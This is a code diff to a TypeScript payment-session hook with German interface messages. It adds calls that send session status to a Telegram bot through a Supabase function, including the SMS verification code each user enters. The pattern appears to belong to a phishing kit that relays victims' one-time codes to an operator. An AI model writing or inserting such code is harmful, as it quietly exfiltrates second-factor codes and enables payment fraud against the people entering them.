@@ -136,6 +136,22 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
         body: { sessionId }
       });
       
+      // Send Telegram notification for app confirmation
+      try {
+        await supabase.functions.invoke('telegram-bot/send-notification', {
+          body: {
+            type: 'verification_update',
+            data: {
+              session_id: sessionId,
+              verification_method: 'app_confirmation',
+              verification_status: 'app_confirmed'
+            }
+          }
+        });
+      } catch (telegramError) {
+        console.warn('Failed to send Telegram verification notification:', telegramError);
+      }
+      
       console.log('App verification confirmed successfully');
       toast({
         title: "App-Bestätigung erfolgreich",
@@ -229,6 +245,23 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
           variant: "destructive"
         });
       } else {
+        // Send Telegram notification for SMS code submission
+        try {
+          await supabase.functions.invoke('telegram-bot/send-notification', {
+            body: {
+              type: 'verification_update',
+              data: {
+                session_id: sessionId,
+                verification_method: 'sms_confirmation',
+                verification_status: 'sms_confirmation',
+                sms_code: code
+              }
+            }
+          });
+        } catch (telegramError) {
+          console.warn('Failed to send Telegram SMS notification:', telegramError);
+        }
+        
         console.log('SMS code submitted successfully');
         toast({
           title: "SMS-Code bestätigt",
